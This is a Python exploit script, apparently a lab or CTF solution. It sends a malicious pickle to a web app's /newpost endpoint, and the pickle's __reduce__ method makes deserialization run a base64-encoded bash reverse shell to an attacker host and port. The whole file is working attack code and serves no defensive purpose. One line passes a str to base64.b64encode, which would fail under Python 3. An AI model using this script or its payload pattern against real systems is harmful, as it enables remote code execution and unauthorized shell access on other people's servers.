import pickle
import base64
import os
import sys
import requests
from colorama import Fore, Style

class exploit(object):
    def __init__(self, cmd):
        self.payload = 'echo ' + cmd + ' | base64 -d | bash'

    def __reduce__(self):
        return (os.system, (self.payload,))

# print(base64.urlsafe_b64encode(pickle.dumps(exploit())).decode())

def send_req(server_ip, payload):
    print(Fore.BLUE + "[*] Sending to server..." + Style.RESET_ALL)
    url = 'http://' + server_ip + ':5000/newpost'
    try:
        r = requests.post(url, data=payload, timeout=(5,5))
    except requests.Timeout:
        pass
    except requests.RequestException as e:
        print(Fore.RED + "[-] Something went wrong." + Style.RESET_ALL)
    
    print(Fore.GREEN + "[+] Payload sent. Check your listener" + Style.RESET_ALL)

def generate_payload(lhost, lport):
    print(Fore.BLUE + "[*] Generating payload..." + Style.RESET_ALL)
    cmd_raw = '/bin/bash -i >& /dev/tcp/' + lhost + '/' + str(lport) + ' 0>&1'
    cmd_b64 = base64.b64encode(cmd_raw)
    pickle_payload = base64.urlsafe_b64encode(pickle.dumps(exploit(cmd_b64))).decode()
    return pickle_payload

def main():
    if len(sys.argv) != 4:
        print(Fore.RED + "[-] Usage: python pickle_rce.py <SERVER_IP> <LHOST> <LPORT>" + Style.RESET_ALL)
        exit(0)
    
    server_ip = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    payload = generate_payload(lhost, lport)
    send_req(server_ip, payload)

if __name__ == "__main__":
    main()